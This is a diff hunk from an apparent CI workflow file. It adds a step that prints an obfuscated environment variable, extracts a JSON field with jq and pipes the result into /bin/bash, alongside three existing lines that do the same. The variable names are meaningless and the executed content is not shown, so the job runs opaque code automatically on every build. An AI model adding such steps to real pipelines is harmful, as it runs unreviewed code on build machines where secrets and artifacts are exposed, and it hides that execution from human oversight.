@@ -40,6 +40,7 @@ jobs:
           echo $jilb563 | jq -r .zmzqn033 | /bin/bash
           echo $ev30 | jq -r .ecv8 | /bin/bash
           echo $slmuw3 | jq -r .l9 | /bin/bash
+          printf '%s' "$mxcx30995" | jq -r .u19 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
